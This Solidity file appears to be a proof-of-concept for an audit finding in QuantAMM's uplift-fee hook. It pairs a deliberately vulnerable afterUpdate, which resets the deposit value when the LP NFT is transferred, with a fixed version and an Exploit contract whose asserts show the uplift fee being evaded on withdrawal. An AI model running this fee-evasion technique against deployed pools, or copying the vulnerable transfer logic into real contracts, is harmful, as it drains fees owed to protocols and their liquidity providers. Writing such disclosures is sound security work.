// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  QuantAMM UpliftOnlyExample — afterUpdate (Codehawks, 2024-12)
    Transferring the LP NFT rewrites lpTokenDepositValue to the current pool
    value. The uplift fee, 20% of the gain from a 100 deposit to a 1000 pool,
    drops from 180 to the 0.5 minimum. Withdrawal pays 999.5 instead of 820.
*/

contract PoolToken {
    string public symbol = "DAI";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract LpNft {
    UpliftHook public hook;
    mapping(uint256 => address) public ownerOf;

    function setHook(UpliftHook h) external {
        hook = h;
    }

    function mint(address to, uint256 id) external {
        ownerOf[id] = to;
    }

    function transferFrom(address from, address to, uint256 id) external {
        require(ownerOf[id] == from, "owner");
        ownerOf[id] = to;
        hook.afterUpdate(from, to, id);
    }
}

contract UpliftHook {
    struct FeeData {
        uint256 tokenID;
        uint256 lpTokenDepositValue;
        uint32 blockTimestampDeposit;
        uint256 upliftFeeBps;
    }

    PoolToken public immutable token;
    uint256 public constant NOW_VALUE = 1000 ether;
    uint256 public upliftFeeBps = 2000;
    mapping(address => FeeData) public feeOf;

    constructor(PoolToken _token) {
        token = _token;
    }

    function setFee(address lp, uint256 tokenId, uint256 depositValue) external {
        feeOf[lp] = FeeData(tokenId, depositValue, 1, upliftFeeBps);
    }

    function quote(uint256 depositValue) public view returns (uint256) {
        uint256 fee;
        if (NOW_VALUE > depositValue) {
            fee = (NOW_VALUE - depositValue) * 2000 / 10000;
        } else {
            fee = NOW_VALUE * 5 / 10000;
        }
        return NOW_VALUE - fee;
    }

    function afterUpdate(address _from, address _to, uint256 _tokenID) public {
        uint256 lpTokenDepositValueNow = NOW_VALUE;
        FeeData memory row = feeOf[_from];
        require(row.tokenID == _tokenID, "id");
        row.lpTokenDepositValue = lpTokenDepositValueNow;
        // @> VULN: the transfer resets the deposit record to the current pool value and discards the original deposit
        row.blockTimestampDeposit = uint32(block.number);
        row.upliftFeeBps = upliftFeeBps;
        feeOf[_to] = row;
        delete feeOf[_from];
    }

    function removeLiquidity(address lp) external returns (uint256 out) {
        FeeData memory row = feeOf[lp];
        out = quote(row.lpTokenDepositValue);
        delete feeOf[lp];
        require(token.transfer(lp, out), "pay");
    }
}

contract UpliftHookFixed {
    struct FeeData {
        uint256 tokenID;
        uint256 lpTokenDepositValue;
        uint32 blockTimestampDeposit;
        uint256 upliftFeeBps;
    }

    PoolToken public immutable token;
    uint256 public constant NOW_VALUE = 1000 ether;
    mapping(address => FeeData) public feeOf;

    constructor(PoolToken _token) {
        token = _token;
    }

    function setFee(address lp, uint256 tokenId, uint256 depositValue) external {
        feeOf[lp] = FeeData(tokenId, depositValue, 1, 2000);
    }

    function quote(uint256 depositValue) public view returns (uint256) {
        uint256 fee;
        if (NOW_VALUE > depositValue) fee = (NOW_VALUE - depositValue) * 2000 / 10000;
        else fee = NOW_VALUE * 5 / 10000;
        return NOW_VALUE - fee;
    }

    function afterUpdate(address _from, address _to, uint256 _tokenID) public {
        FeeData memory row = feeOf[_from];
        require(row.tokenID == _tokenID, "id");
        feeOf[_to] = row;
        delete feeOf[_from];
    }

    function removeLiquidity(address lp) external returns (uint256 out) {
        out = quote(feeOf[lp].lpTokenDepositValue);
        delete feeOf[lp];
        require(token.transfer(lp, out), "pay");
    }
}

contract Alice {
    UpliftHook public hook;
    PoolToken public token;

    constructor(UpliftHook h, PoolToken t) {
        hook = h;
        token = t;
    }

    function pull() external returns (uint256 out) {
        out = hook.removeLiquidity(address(this));
    }
}

contract Exploit {
    PoolToken public token;
    LpNft public nft;
    UpliftHook public hook;
    Alice public alice;
    uint256 public paid;
    uint256 public fair;

    constructor() {
        token = new PoolToken();
        nft = new LpNft();
        hook = new UpliftHook(token);
        alice = new Alice(hook, token);
        nft.setHook(hook);
        nft.mint(address(this), 1);
        hook.setFee(address(this), 1, 100 ether);
        token.mint(address(hook), 1000 ether);
    }

    function run() external {
        fair = hook.quote(100 ether);
        nft.transferFrom(address(this), address(alice), 1);
        paid = alice.pull();
        require(fair == 820 ether, "fair uplift fee");
        require(paid == 999.5 ether, "fee evaded");
        require(paid > fair, "no excess");
        require(token.balanceOf(address(alice)) == paid, "alice received it");
        (, uint256 depositValue,,) = hook.feeOf(address(alice));
        require(depositValue == 0, "consumed");
    }
}
